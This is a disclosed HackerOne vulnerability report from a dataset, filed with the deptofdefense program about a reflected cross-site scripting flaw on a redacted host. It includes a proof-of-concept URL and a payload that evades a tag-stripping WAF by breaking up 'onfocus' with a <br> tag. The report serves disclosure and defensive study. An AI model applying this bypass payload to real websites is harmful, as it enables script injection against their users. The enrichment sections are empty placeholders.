---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1251868'
original_report_id: '1251868'
title: XSS on https://████/ via ███████ parameter
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: deptofdefense
created_at: '2021-07-05T15:57:35.846Z'
disclosed_at: '2022-04-07T19:55:49.404Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 6
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# XSS on https://████/ via ███████ parameter

## Metadata

- HackerOne Report ID: 1251868
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: deptofdefense
- Disclosed At: 2022-04-07T19:55:49.404Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

PoC
```
https://████████/██████=█████████%22%20o%3Cbr%3Enfocus=confirm(1337)%20autofocus%20tabindex=1%20xss
```

Payload
```
 o<br>nfocus=confirm(1337) autofocus tabindex=1 xss
```

WAF bypass
Tags are removed from user input. It is allowed to bypass WAF.
███

## Impact

XSS on https://████████/

## System Host(s)
███

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
Go to
```
https://█████/██████=████%22%20o%3Cbr%3Enfocus=confirm(1337)%20autofocus%20tabindex=1%20xss
```

## Suggested Mitigation/Remediation Actions

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
